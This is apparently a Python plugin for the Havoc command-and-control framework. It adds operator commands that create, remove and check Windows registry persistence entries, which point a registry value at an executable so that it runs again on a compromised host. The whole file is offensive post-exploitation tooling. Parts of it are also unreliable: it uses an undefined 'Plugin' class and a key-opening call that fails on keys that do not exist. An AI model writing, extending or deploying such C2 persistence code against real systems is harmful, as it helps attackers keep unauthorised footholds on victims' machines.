from havoc import Demon, RegisterCommand
import winreg
import os
import platform

def create_persistence(key_path, value_name, executable_path):
    """
    Creates a persistence entry in the Windows registry.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] Registry persistence is only supported on Windows."

        # Open the registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, executable_path)
        winreg.CloseKey(key)
        return f"[+] Persistence created: {key_path}\\{value_name} -> {executable_path}"
    except Exception as e:
        return f"[-] Error creating persistence: {e}"

def remove_persistence(key_path, value_name):
    """
    Removes a persistence entry from the Windows registry.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] Registry persistence is only supported on Windows."

        # Open the registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, value_name)
        winreg.CloseKey(key)
        return f"[+] Persistence removed: {key_path}\\{value_name}"
    except Exception as e:
        return f"[-] Error removing persistence: {e}"

def check_persistence(key_path, value_name):
    """
    Checks if a persistence entry exists in the Windows registry.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] Registry persistence is only supported on Windows."

        # Open the registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
        value, _ = winreg.QueryValueEx(key, value_name)
        winreg.CloseKey(key)
        return f"[+] Persistence found: {key_path}\\{value_name} -> {value}"
    except FileNotFoundError:
        return f"[-] Persistence not found: {key_path}\\{value_name}"
    except Exception as e:
        return f"[-] Error checking persistence: {e}"

# Havoc C2 Integration
def create_persistence_command(demon, *args):
    """
    Command to create a persistence entry in the registry.
    """
    if len(args) != 3:
        demon.ConsoleWrite("[-] Usage: create_persistence [key_path] [value_name] [executable_path]")
        return

    key_path = args[0]
    value_name = args[1]
    executable_path = args[2]

    result = create_persistence(key_path, value_name, executable_path)
    demon.ConsoleWrite(result)

def remove_persistence_command(demon, *args):
    """
    Command to remove a persistence entry from the registry.
    """
    if len(args) != 2:
        demon.ConsoleWrite("[-] Usage: remove_persistence [key_path] [value_name]")
        return

    key_path = args[0]
    value_name = args[1]

    result = remove_persistence(key_path, value_name)
    demon.ConsoleWrite(result)

def check_persistence_command(demon, *args):
    """
    Command to check if a persistence entry exists in the registry.
    """
    if len(args) != 2:
        demon.ConsoleWrite("[-] Usage: check_persistence [key_path] [value_name]")
        return

    key_path = args[0]
    value_name = args[1]

    result = check_persistence(key_path, value_name)
    demon.ConsoleWrite(result)

# Register commands with Havoc C2
def initialize():
    RegisterCommand("create_persistence", "Create a persistence entry in the registry", create_persistence_command)
    RegisterCommand("remove_persistence", "Remove a persistence entry from the registry", remove_persistence_command)
    RegisterCommand("check_persistence", "Check if a persistence entry exists in the registry", check_persistence_command)

# Initialize the plugin
plugin = Plugin("RegistryPersistence", "Advanced registry persistence techniques", initialize)